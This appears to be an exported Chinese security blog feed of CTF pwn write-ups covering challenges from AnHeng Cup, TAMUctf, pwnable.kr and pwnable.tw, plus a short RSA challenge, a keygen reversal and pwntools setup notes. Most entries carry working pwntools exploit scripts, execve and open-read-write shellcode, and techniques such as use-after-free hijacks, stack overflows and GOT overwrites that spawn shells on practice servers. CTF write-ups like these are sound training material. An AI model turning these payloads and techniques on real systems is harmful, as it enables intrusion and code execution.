然后给要上传的image标注用户名(就是docker账号的用户名)和版本。tag可选。 如： docker image tag advkeygen muirelle/advkeygen 接着重构image文件： docker image build -t [username]/[repository]:[tag] . 最后发布image文件: docker image push [username]/[repository]:[tag] 发布完成后可以在官网登录账号查看自己的image 用命令 docker image pull muirelle/advkeygen 就可以在其他设备拉取到之前上传的镜像了。 :)]]></content>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安恒杯2019二月-pwn]]></title>
    <url>%2F2019%2F03%2F02%2F%E5%AE%89%E6%81%92%E6%9D%AF2019%E4%BA%8C%E6%9C%88-pwn%2F</url>
    <content type="text"><![CDATA[考点比较单一，读懂每个函数都做了什么，加上uaf的一点知识就能做了。如果开启了pie应该是用来练习绕过pie的很好的一道题。 hackmoonhttps://xpro-adl.91ctf.com/userdownload?filename=5c6cb469e9a76.zip&amp;type=attach&amp;feature=custom 查看保护 主函数，圈出来的三个函数是整个程序的主要功能 逐个分析： add_moonmoonlist是指向bss段的指针，一个指针为4字节。 从下标0到4依次判断moonlist[i]是否为0，若为零则代表该指针为空，继续进行分配空间的操作。 首先将moonlist[i]指向新申请的8字节heap空间中（设为chunk_A），然后(_DWORD )moonlist[i] = print_moon_content;将函数print_moon_content()的地址放在chunk_A的前4字节中。 接着从键盘读取8字节输入，转成int存于变量size中。v0 = moonlist[i]令指针v0等于moonlist[i]，所以v0也指向chunk_A。 v0[1] = malloc(size);直接看不容易理解，配合反汇编的代码可以很容易理解： 1234567.text:0804874E mov ebx, ds:moonlist[eax*4] . . ..text:0804875C call _malloc.text:08048761 add esp, 10h.text:08048764 mov [ebx+4], eax 先在chunk_A后面malloc一个size大小的chunk(设为chunk_B)，再将指向chunk_B的指针返回给eax，并赋给[ebx+4]，也就是[moonlist[i]+4]，也就是*(moonlist[i]+4)，所以用户申请的空间chunk_B的地址其实存放于chunk_A的后4字节。总结：moonlist[i]指向chunk_A，chunk_A前四字节指向print_moon_content()，后四字节指向chunk_B。chunk_B存放用户输入的数据。 最后从用户读取size大小的数据存放于chunk_B中。count递增1。 print_moon 从键盘输入要打印的内容的下标转int后赋值给v1。 12if ( moonlist[v1] )(*(void (__cdecl **)(void *))moonlist[v1])(moonlist[v1]); 随后调用打印函数就只有这一句话，看上去很难理解，所以还是回到反汇编： 12345678910111213141516.text:08048945 mov eax, [ebp+var_14].text:08048948 mov eax, dword ptr ds:moonlist[eax*4].text:0804894F test eax, eax .text:08048951 jz short loc_8048972 #判断v1是否超出范围.text:08048953 mov eax, [ebp+var_14].text:08048956 mov eax, dword ptr ds:moonlist[eax*4] #此时eax=moonlist[i]，所以eax指向chunk_A.text:0804895D mov eax, [eax] #[eax]取chunk_A中的值也就是print_moon_content()的地址，再赋给eax。此时eax指向print_moon_content().text:0804895F mov edx, [ebp+var_14].text:08048962 mov edx, dword ptr ds:moonlist[edx*4] #将edx也指向chunk_A。.text:08048969 sub esp, 0Ch.text:0804896C push edx #edx压栈，作为参数传递。.text:0804896D call eax #此时调用print_moon_content()，chunk_A地址作为参数。.text:0804896F add esp, 10h print_moon_content1234int __cdecl print_moon_content(int a1)&#123; return puts(*(const char **)(a1 + 4));&#125; a1为指针，打印a1+4后的内容。也就是chunk_B，用户输入的内容。 del_moon 读取下标。先free掉chunk_B再free掉chunk_A。 uaf发现magic函数，目标就是调用它。 函数分析完了大致也知道是一个uaf的漏洞了，一开始想复杂了还在到处找溢出点，后面发现直接就是一个纯粹的uaf。。 思路：调用两次add_moon，得到moonlist[0],moonlist[1] (大小随意，不要太大，而且不能是8字节。内容随意)，再free掉这两个moon，再调用一次add_moon（大小为8字节，内容是magic的地址)，最后打印moonlist[1] 解释：因为每调用依次add_moon就会malloc两个chunk，而且有一个是固定的8字节大小。所以add_moon两次再free两次就会出现4个free chunk存放在fastbin中，两个8字节大小，两个自定大小。当再次add_moon一个8字节大小的moon时，fastbin就会把刚才的两个8字节chunk分配给我们。而由于第二个8字节chunk是内容可控的，同时这个chunk还是moonlist[1]的头部(也就是8字节部分)，此时用magic的地址替换掉原来print_moon_content的地址，再调用print_moon打印moonlist[1]，调用magic函数。(如果最开始申请的两个moon大小为8字节就没办法控制另一个moon的头部信息了，所以一定不能是8字节) 第一次申请后： 最后期待的heap内容应该是这样： 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *r = remote('101.71.29.5',10013)def choose(i): print (r.recvuntil('Your choice :')) r.sendline(str(i)) def add_moon(size, s): print (r.recvuntil('moon size :')) r.sendline(str(size)) print (r.recvuntil('Content :')) r.sendline(s)def del_moon(index): print (r.recvuntil('Index :')) r.sendline(str(index))def print_moon(index): print (r.recvuntil('Index :')) r.sendline(str(index))magic = 0x08048986choose(1)add_moon(0x10, 'AAAA')choose(1)add_moon(0x10, 'BBBB')choose(2)del_moon(1)choose(2)del_moon(0)choose(1)add_moon(0x8, p32(magic))choose(3)print_moon(1)r.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TAMUctf]]></title>
    <url>%2F2019%2F03%2F01%2FTAMUctf%2F</url>
    <content type="text"><![CDATA[摸鱼，做题。 捡了几道简单的pwn题做，剩下的真做不出来，等着收一波大佬的wp pwnpwn1题目：https://tamuctf.com/files/b804e1ab7d43ff479292094d9ec64526/pwn1 找偏移覆盖v5的值即可 通过padding找到偏移 最后脚本： 12345678910111213141516171819from pwn import *r = remote('pwn.tamuctf.com',4321)print (r.recv())r.sendline('Sir Lancelot of Camelot')print (r.recv())r.sendline('To seek the Holy Grail.')print (r.recv())r.sendline('AAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK'+p32(0xdea110c8))print (r.recv())r.interactive() 有个疑问，不知道为什么最后加了interactive才出flag，理论上应该直接出的，想不通。 pwn2题目：https://tamuctf.com/files/fe3b76a986798016f0b868da03a56c79/pwn2 开的保护蛮多的 gets读取用户输入 将长度最大为0x1f的数据复制到dest所指向的位置。如果dest所指字符串为’one’则调用函数one。整个函数流程差不多就这样。 这个return v3()很诱人啊，于是想把v3覆盖成函数print_flag()的地址。但是注意到源程序开了pie保护，没办法直接拿到print_flag()的地址。 注意观察一下dest和v3在栈上的位置，dest在ebp-0x2a。0x2a减去最大能输入的字符串长度0x1f等于0xb，而v3在ebp-0xc，也就是说v3的最后一个字节是可以被覆盖到的。 google了一下，知道了pie不会随机化地址的低12位。 利用这个特性，再加上发现two距离print_flag()很近，所以只需要把two地址的最后一个字节覆盖成print_flag()地址的最后一个字节就可以成功调用print_flag()函数了。 123456789101112from pwn import *r = remote('pwn.tamuctf.com',4322)print(r.recv())s = 'aa' + 'a'*4*7 + '\xdc'r.sendline(s)print (r.recv())r.interactive() 同样也是加了interactive才能拿flag，有点奇怪。 pwn5题目：https://tamuctf.com/files/faf489a3ffea904aba9fea47647584b8/pwn5 pwn4都不需要dump文件下来，连服务器直接做，在discord里面被大佬一通嘲笑2333。 pwn5就是pwn4的升级版，限定了可输入命令的长度为4，导致没办法像pwn4那样直接.;cat flag.txt就可以拿flag那么简单了。 没开pie，挺好的。（好像患上了pie恐惧症） main函数里就只有一个laas()函数。读取不带反斜杠的字符串。 函数run_cmd中直接调用了system，但是貌似不能直接在这个函数里搞事情，因为v2的长度被限制死了。 但是别忘了laas()里用了gets而且没开canary保护，所以直接覆盖返回值为system吧。。 先找到’/bin/sh’的位置0x080bc140 再找到system的地址：0x804ee30 然后计算偏移：s位于ebp+0xd，所以ret位于0xd+0x4=0x11 123456789101112from pwn import *r = remote('pwn.tamuctf.com',4325)print(r.recv())s = 'a'*0x11 + p32(0x804ee30) + 'aaaa' + p32(0x080bc140)r.sendline(s)print (r.recv())r.interactive() 补充:看过wp后发现还是想复杂了。。。也是直接连服务器就能做。忘了ls可以不用加参数，所以连上服务器然后;sh完事。。。 pwn3题目：https://tamuctf.com/files/9dc4f5b5523625eb82f2d0de5e16291a/pwn3 很简单的一道题结果最后才做出来。。。 没开canary和nx 整个程序就只有这么一点，泄露了s处的栈地址。 一直在想怎么怎么泄露libc的基址好绕过pie，然而最简单的覆盖ret劫持流程加shellcode的组合却忘了(´_ゝ`)。 1234567891011121314151617from pwn import *r = remote('pwn.tamuctf.com',4323)print(r.recvuntil('Take this, you might need it on your journey '))leak_stack = int(r.recvuntil('!')[2:-1], 16)print(leak_stack)x = 0x12a# #shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'payload = shellcode + 'a'*(x-len(shellcode)) + 'aaaa' + p32(leak_stack)r.sendline(payload)r.interactive() Reversekeygenmedocker环境docker pull muirelle/advkeygen:latest 到最后也没拿到这道题flag，反向验证没问题，一直不知道那里出错了，甚至最后开始怀疑起了服务器。 看了wp才知道是多了一个字节。分析一波原因。 整个程序的流程大致如下： 读取用户输入字符串a1，限制长度在0x9到0x40之间。 经过enc()对a1每一字节的各种运算，最后返回被修改后的a1，再与字符串[OIonU2_&lt;__nK&lt;KsK作比较，相等的话就输出flag。 有个坑点，一不注意就会掉进去，就是换行符的问题。 由于一开始没有注意到程序中用了fgets来读取输入(fgets会读取换行符并在后面加上空字符，而gets会将换行符直接替换为空字符)，所以最后生成的字符串[OIonU2_&lt;__nK&lt;KsK的最后一个字节就是由换行符生成的。所以a1的长度其实只有上面那个字符串的长度-1，因为换行符会占一字节。 当时还专门写了一段c去正向测试是否能输出[OIonU2_&lt;__nK&lt;KsK，结果是可以正确输出的，但是没有意识到自己用的是scanf读取输入，所以导致strlen获取长度时少读取了一个换行符的长度，就一直没做出来。。。 最后解题脚本如下： 12345678910111213141516171819v5='[OIonU2_&lt;__nK&lt;KsK'ans=''ans2 = ''flag = 0for i in range(0,len(v5)-1): #就是因为这里少了一个-1 for j in range(32,127): if(i == 0): if ((((j + 12) * 72 + 17) % 70 + 48) == ord(v5[i])): ans+=chr(j) else: if ((((j + 12) * ord(v5[i-1]) + 17) % 70 + 48) == ord(v5[i])): ans+=chr(j) ans2+=ans[len(ans)-1] #print (ans) ans=''print(ans2) cryptoRSAaaay题目： Hey, you’re a hacker, right? I think I am too, look at what I made! (2531257, 43) My super secret message: 906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268 Problem is, I don’t remember how to decrypt it… could you help me out? 这道题还算简单，趁着去学了一点rsa。由于没有反应过来解密后的数字是合并后的ascii码，和flag擦肩而过。 123456789101112131415161718192021import stringc = '906851 991083 1780304 2380434 438490 356019 921472 822283 817856 556932 2102538 2501908 2211404 991083 1562919 38268'pub = (2531257,43)p = 509q = 4973r = 2525776e = 43l = c.split(' ')dec=''sig=''for i in range(len(l)): dec += str((pow(int(l[i]),58739,pub[0])))for i in range(len(dec)): sig+=dec[i] if(int(sig) in range(0x20, 0x7f)): print(chr(int(sig)),end='') sig='']]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr[Rookiss]]]></title>
    <url>%2F2019%2F02%2F02%2Fpwnable-kr-Rookiss%2F</url>
    <content type="text"><![CDATA[继续pwnable.kr的第二个难度——Rookiss 第一个难度在这里(有些题目的wp没写上去)：https://muirelle.com/2018/12/30/Pwnable-kr/ 题目链接: http://pwnable.kr/play.php brain fuck题目： Download : http://pwnable.kr/bin/bf Download : http://pwnable.kr/bin/bf_libc.so Running at : nc pwnable.kr 9001 现在题目不给源码了，越来越接近ctf的题目了。 放进ida看，主要是两个函数，main和do_brainfuck 什么是brainfuck 了解了bf语言后可以知道题目本身相当于一个缺少[和]功能的bf语言，用户通过输入字符控制指针移动和读写。 看下指针一开始在什么位置 p是指针，tape是指针指向的位置，位于bss段。 bss段距离堆和栈都太远了，fgets又限制了1024字节，所以不可能把指针移动到堆或栈上再操作了。 卡了半天，最后看wp才知道bss段附近不远就是got.plt段，可以直接修改plt表让原先的函数跳转到其他函数去。 接下来的思路： 把main函数的memsetgot.plt表跳转的地址覆盖成gets，fgets覆盖为system，最后把putchar覆盖成main。第二次进入main后，在执行gets时输入’/bin/sh&#39;，接着system就会调用该参数，拿到shell。 接下来的操作： 先将指针移动到got.plt段，打印出一个libc函数的地址后减去这个函数在libc中的偏移，就能得到libc的基址。用libc的基址加上system得到system的真实地址，同理，拿到gets的地址。最后按照思路写出shellcode。 123456789101112131415161718192021222324252627from pwn import *libc = ELF('./bf_libc.so')r = remote('pwnable.kr', 9001)print (r.recvuntil('except [ ]\n'))shellcode = ''shellcode += '&lt;'*(0x0804A0A0-0x0804A010)shellcode += '.&gt;'*4shellcode += '&lt;'*4 + ',&gt;'*4shellcode += '&lt;'*4 + '&gt;'*(0x0804A02C-0x0804A010)shellcode += ',&gt;'*4shellcode += ',&gt;'*4shellcode += '.'r.sendline(shellcode)fgets_addr = r.recvn(4)[::-1].encode('hex')libc_base = int(fgets_addr, 16) - libc.symbols['fgets']system_addr = libc_base + libc.symbols['system']gets_addr = libc_base + libc.symbols['gets']r.send(p32(system_addr))r.send(p32(gets_addr))r.send(p32(0x8048671))r.sendline('/bin/sh')r.interactive() flag:BrainFuck? what a weird language.. md5 calculator题目： Download : http://pwnable.kr/bin/hash Running at : nc pwnable.kr 9002 开了canary和NX 进ida 这个程序的流程是： my_hash函数提供验证码(captcha)，输入验证码，验证成功后进入功能函数process_hash，该函数将用户输入的经过base64加密的密文解密之后再散列成md5发送给用户。 先看看my_hash 开始一直不知道这个是干嘛的，也没有搜到，后面看wp猜测就是插入栈中的canary。从图中看到v10位于ebp-0xc的位置。 在最后验证canary值的时候是用的ebp+var_C(var_C==-0xc)也就是v10和canary初始值作比较的，所以进一步确定v10就是canary。 可以看到canary的值参与了captcha的运算，也就是说如果我们能拿到生成随机数的种子就可以反推出canary，从而绕过这个保护。 然而随机数种子就是通过time(0)得到的，为了避免运行脚本的时候系统时间和服务器时间不一致，把脚本放在服务器运行就可以了。 光知道了绕过canary没有栈溢出还是白搭。去看看process_hash。 这里fgets接收的经base64编码后的字符串，最大长度为1024字节，而转换后的原字符串长度给了512(0x200)字节的空间。但是通过计算可以知道，1024字节的base64密文解码后的长度是768字节(看了wp后表示学到了ORZ)，所以存在栈溢出。 计算好偏移之后就可以写脚本了 123456789101112131415#include&lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; int t = time(0); srand(t); int r[8]; for (int i = 0; i &lt;= 7; ++i) r[i] = rand(); int captcha = atoi(argv[1]); printf("%d", captcha - r[4] + r[6] - r[7] - r[2] + r[3] - r[1] - r[5]); return 0;&#125; 123456789101112131415161718192021222324252627from pwn import *import osr = remote('127.0.0.1', 9002)print (r.recvuntil('captcha : '))captcha = r.recv().strip()print (captcha)r.sendline(captcha)captcha = int(captcha)print (r.recvuntil('paste me!\n'))cookie = int(os.popen("./noxus %d"%captcha).read())g_buf = 0x804b0e0binsh_addr = (len(payload)+'a'*4)*3/4 #payload的长度*0.75就是'binsh'在g_buf中的位置payload = 'a'*512 #paddingpayload += p32(cookie) #canarypayload += 'a'*0xc #paddingpayload += p32(0x8048880) #system地址payload += 'a'*4 #原本此位置是system返回地址，用不到，所以padding。payload += p32(g_buf+(512+4+12+4+4+4)*4/3) #'binsh'位置在g_buf中，payload编码后长度要*4/3payload = b64e(payload) + '/bin/sh\0'r.sendline(payload)r.interactive() 写好脚本后随便找一个之前的题目进服务器，然后 12345fd@ubuntu:~$ cd /tmp/fd@ubuntu:/tmp$ vim noxus.cfd@ubuntu:/tmp$ gcc -o noxus noxus.cfd@ubuntu:/tmp$ vim demacia.pyfd@ubuntu:/tmp$ python demacia.py 笔记： 1、字符串经某种方式编码或解码后长度会发生改变，通常编码或解码后的长度是可计算的，若内存没有合理分配则可能导致栈溢出。 2、可以利用题目中混杂canary的计算推出canary的值。 3、不将/bin/sh放在栈上是因为无法通过base64解码出一个空字符(base64不可编码/解码空字符)，导致无法控制system参数。所以选择在bss段的g_buf上放置未加密的’/bin/sh’。 simple login题目： Download : http://pwnable.kr/bin/login Running at : nc pwnable.kr 9003 看到这题好多函数都和上一题一样，还以为又要栽了，结果比想象中简单。。。flag概括了整道题的考点hhh flag： control EBP, control ESP, control EIP, control the world~ 进ida，main函数 把关键部分找出来，然后仔细审计，弄清楚流程 从上图看出：程序从用户读取base64编码后的字符串，经Base64Decode解码后的字符串的长度放在v6，址放在v4，并且要求v6要小于等于12(0xc)。然后通过memcpy把解码后的字符串放在一个bss段的变量input中，接着，若auth返回值为1就调用correct从而拿到shell。 所以进auth看看通过控制main函数中v6值为12，则auth中a1为12，则在执行memcpy时就会将12字节的数据复制到只有4字节大小的v4上，又注意到v4在栈中的位置为ebp-8h，所以最后的四个字节会将ebp覆盖掉。 控制了ebp之后，esp就好说了。 虽然在这个函数返回时esp并不会被影响，但在下一个函数返回之前执行leave指令时，ebp的值就会赋给esp，从而间接控制esp。 构造输入后的字符串经base63解码后是这个样子就行了。(红框内是溢出部分)system_addr不放在开头的原因是因为leave中还有一个pop ebp的操作，esp相应的会+4，所以system_addr往后放了4个字节。 123456789from pwn import *r = remote('pwnable.kr', 9003)print (r.recvuntil('Authenticate : '))payload = b64e('a'*4+p32(0x08049284)+p32(0x0811eb40))r.sendline(payload)print (r.recv())r.interactive() 笔记： 1、控制ebp可以间接控制esp，进而控制eip，从而劫持函数流。 2、一开始本来打算esp指向栈中的system，但是无法成功调用，只有指向bss段的system才能成功调用。目前还不清楚原因。 otp题目：ssh otp@pwnable.kr -p2222 (pw:guest) 想了半天，找不到溢出点，结果不是溢出。。。 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;int main(int argc, char* argv[])&#123; char fname[128]; unsigned long long otp[2]; if(argc!=2)&#123; printf("usage : ./otp [passcode]\n"); return 0; &#125; int fd = open("/dev/urandom", O_RDONLY); if(fd==-1) exit(-1); if(read(fd, otp, 16)!=16) exit(-1); close(fd); sprintf(fname, "/tmp/%llu", otp[0]); FILE* fp = fopen(fname, "w"); if(fp==NULL)&#123; exit(-1); &#125; fwrite(&amp;otp[1], 8, 1, fp); fclose(fp); printf("OTP generated.\n"); unsigned long long passcode=0; FILE* fp2 = fopen(fname, "r"); if(fp2==NULL)&#123; exit(-1); &#125; fread(&amp;passcode, 8, 1, fp2); fclose(fp2); if(strtoul(argv[1], 0, 16) == passcode)&#123; printf("Congratz!\n"); system("/bin/cat flag"); &#125; else&#123; printf("OTP mismatch\n"); &#125; unlink(fname); return 0;&#125; 源码用urandom生成了16字节的随机数，前八字节作为一个文件名，后八字节作为这个文件的内容，如果用户输入和文件内容相同则拿到flag。 解题的关键就是用ulimit -f 0命令将用户可创建文件的大小置零，于是源码中创建文件的语句得不到执行，最后读取文件内容就是空字符。 123456#!/user/bin/pythonimport subprocesssubprocess.Popen(['/home/otp/otp', ''], stderr=subprocess.STDOUT) #]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.tw]]></title>
    <url>%2F2019%2F01%2F21%2FPwnable-tw%2F</url>
    <content type="text"><![CDATA[题目链接：https://pwnable.tw/ 题目start题目： https://pwnable.tw/static/chall/start nc chall.pwnable.tw 10000 32位，静态链接 输入一些东西之后没什么反应 可以看到 123450x0804806e &lt;+14&gt;: push 0x3a4654430x08048073 &lt;+19&gt;: push 0x206568740x08048078 &lt;+24&gt;: push 0x207472610x0804807d &lt;+29&gt;: push 0x747320730x08048082 &lt;+34&gt;: push 0x2774654c 这一段就是 Let’s start the CTF: 123450x08048087 &lt;+39&gt;: mov ecx,esp ;要写的数据的地址0x08048089 &lt;+41&gt;: mov dl,0x14 ;要写的数据长度0x0804808b &lt;+43&gt;: mov bl,0x1 ;文件描述符file descriptor (stdout)0x0804808d &lt;+45&gt;: mov al,0x4 ;系统调用码system call number (sys_write)0x0804808f &lt;+47&gt;: int 0x80 ;调用内核call kernel 和 12340x08048091 &lt;+49&gt;: xor ebx,ebx ;文件描述符file descriptor (stdin)0x08048093 &lt;+51&gt;: mov dl,0x3c ;数据长度0x08048095 &lt;+53&gt;: mov al,0x3 ;系统调用码system call number (sys_read)0x08048097 &lt;+55&gt;: int 0x80 ;调用内核call kernel 分别是两段linux的系统调用(Linux System Call) 分别调用了write和read，用于将刚刚那句提示信息输出到屏幕和读取我们输入的数据。 下个断点看看 覆盖了ret的地址 再看一下开了什么保护 emm什么都没开，本来一开始是想ret2libc的，但是找了半天的gadgets想ROP结果白忙活一场，后来查了一下发现由于这个文件是静态链接生成的(statically linked)，没办法ret2libc，所以自然想到ret2shellcode 现在的问题就是要在栈上找个位置放shellcode。 注意到程序一开始将esp的值push到栈里了，而且经过gdb调试发现ret返回后这个值刚好在栈顶，所以，将ret的值覆盖为0x8048087，于是再一次调用write将栈顶的值泄露出来。 在第二轮write和read后，ret之前，栈中期待的效果是这样 黄色为20个字节的padding，红色是已经被泄露出来的栈地址，蓝色是将要填充的第二次ret地址，所以应该跟在他后面，为0xbffff734 = 泄露的esp + 20，橙色部分则为shellcode。 由此构造出最后脚本 123456789101112from pwn import *r = remote('chall.pwnable.tw',10000)print (r.recv())shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'ret = 0x08048087p1 = 'a'*20 + p32(ret)r.send(p1)addr = u32(r.recv(4))p2 = 'a'*20 + p32(addr+20) + shellcoder.send(p2)r.interactive() shellcode还是在http://shell-storm.org/shellcode/这上面找的。选了一个execve(‘/bin/sh’)的 最后getshell，在start用户目录下找到flag文件 FLAG{Pwn4bl3_tW_1s_y0ur_st4rt} orw题目： https://pwnable.tw/static/chall/orw nc chall.pwnable.tw 10001 看一眼保护 先注意到红框和蓝框部分，蓝框部分用read读取输入之后直接call了刚刚输入的内容。。。明摆着的ret2shellcode。 但是红框里的函数没见过，简单了解一了下这个函数的作用就是让该进程进入“安全”模式，所有除了read，write，exit和sigreturn的系统调用都会触发sigkill信号来终止进程。 而题目提示我们只有open，read， write三个可用的syscall。同时又告诉了我们flag的位置：/home/orw/flag 所以思路就是先用open打开flag文件，再用read读取flag文件，最后用write输出到屏幕。 先将/home/orw/flag转换成hex： 2f686f6d652f6f72772f666c61670000 再转成小端序： 000067616c662f77726f2f656d6f682f 最后的汇编代码如下： 12345678910111213141516171819200: 31 c0 xor eax,eax ;2: 31 db xor ebx,ebx ;4: 31 c9 xor ecx,ecx ;6: 31 d2 xor edx,edx ;清零8: 68 61 67 00 00 push 0x6761 ;d: 68 77 2f 66 6c push 0x6c662f77 ;12: 68 65 2f 6f 72 push 0x726f2f65 ;17: 68 2f 68 6f 6d push 0x6d6f682f ;/home/orw/flag1c: b8 05 00 00 00 mov eax,0x5 ;system call number (open)21: 89 e3 mov ebx,esp ;将刚才入栈的字符串地址作为第一个参数传给open23: cd 80 int 0x80 ;call kernal25: 89 d9 mov ecx,ebx ;将刚才的esp传给ecx27: 89 c3 mov ebx,eax ;eax接收了open的返回值后作为file descriptor赋值给ebx作为read的第一个参数29: b8 03 00 00 00 mov eax,0x3 ;system call number (read)2e: ba 30 00 00 00 mov edx,0x30 ;选一个较大的数字作为length33: cd 80 int 0x80 ;call kernel35: b8 04 00 00 00 mov eax,0x4 ;system call number (write)3a: bb 01 00 00 00 mov ebx,0x1 ;file descriptor(stdout)3f: ba 30 00 00 00 mov edx,0x30 ;length44: cd 80 int 0x80 ;call kernel 生成shellcode： “\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\xCD\x80\x89\xD9\x89\xC3\xB8\x03\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80” 网址：https://defuse.ca/online-x86-assembler.htm#disassembly 简单介绍一下linux system call： eax的用处是传递system call number ebx，ecx，edx，esi，edi和ebp按顺序依次存放syscall的各个参数。（比如调用sys_read：eax为3，ebx为file descriptor，ecx为buffer的地址，edx为读取数据的长度。） 最后int 0x80根据eax的值来执行相关的中断 返回值通常存放在eax中 最后脚本： 1234567from pwn import *shellcode = "\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x68\x61\x67\x00\x00\x68\x77\x2F\x66\x6C\x68\x65\x2F\x6F\x72\x68\x2F\x68\x6F\x6D\xB8\x05\x00\x00\x00\x89\xE3\xCD\x80\x89\xD9\x89\xC3\xB8\x03\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xBA\x30\x00\x00\x00\xCD\x80"r = remote("chall.pwnable.tw", 10001)r.recvuntil("shellcode:")r.sendline(shellcode)print r.recv() FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwntools安装和使用]]></title>
    <url>%2F2019%2F01%2F20%2Fpwntools%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[安装这玩意经常遇到各种莫名的问题 安装安装方法就老老实实的去pwntools主页看，被其他人写的教程坑过不止一遍。 安装方法 1234apt-get updateapt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentialpip install --upgrade pippip install --upgrade pwntools 在执行最后一条命令时报错：Import Error:cannot import name main 解决方法： 1sudo vim /usr/bin/pip 将 1from pip import main 改成 1from pip._internal import main 即可 使用手册： http://docs.pwntools.com/en/stable/]]></content>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pwnable.kr[Toddler's Bottle]]]></title>
    <url>%2F2018%2F12%2F30%2FPwnable-kr%2F</url>
    <content type="text"><![CDATA[再不更博客就生灰了，找点题做 题目链接: http://pwnable.kr/play.php 前置这里面的题大都是需要通过ssh连接到远程服务器上做，像这样 emmmmm，直接连就行了 为了方便可以scp到本地，连着服务器做确实有点卡，不是很舒服。 scp -r -P2222 fd@pwnable.kr:/home/fd . -r是复制整个目录，-P端口一定要大写 题目fd题目: ssh fd@pwnable.kr -p2222 (pw:guest) 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; 看源码知道，输入的第一个参数减去0x1234后作为read的第一个参数。 当read的第一个参数为0的时候表示从stdin读取数据。 fd@ubuntu:~$ ./fd $(python -c &apos;print &quot;4660&quot;&apos;) LETMEWIN good job :) mommy! I think I know what a file descriptor is!! :) collision题目: ssh col@pwnable.kr -p2222 (pw:guest) 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; 要求输入长度20个字节的数据，check_password将char指针强制转换为int，所以每4个字节一循环，加在res上，最后如果res == hashcode就拿flag。 所以，构造。(注意构造的数字里不能出现空字符\x00） 12&gt;&gt;&gt; hex(0x21dd09ec-(0x01010101)*4)'0x1dd905e8' col@ubuntu:~$ ./col $(python -c &quot;print &apos;\x01&apos; * 16 + &apos;\xE8\x05\xD9\x1D&apos;&quot;) daddy! I just managed to create a hash collision :) :) bof题目: Download : http://pwnable.kr/bin/bof Download : http://pwnable.kr/bin/bof.c Running at : nc pwnable.kr 9000 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 这次直接给了elf文件。扔进ida 可以看到蓝色为overflow的地址，紫色为key的地址，相差0x2c+0x8 = 0x34 = 52个字节 :) flag题目: http://pwnable.kr/bin/flag 题目提示逆向 扔进ida 应该是upx加壳了 所以自然就要脱壳 再扔进ida，注意到flag，跳转 拿到flag :) passcode题目: ssh passcode@pwnable.kr -p2222 (pw:guest) 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf("enter passcode1 : "); scanf("%d", passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf("enter passcode2 : "); scanf("%d", passcode2); printf("checking...\n"); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf("Login OK!\n"); 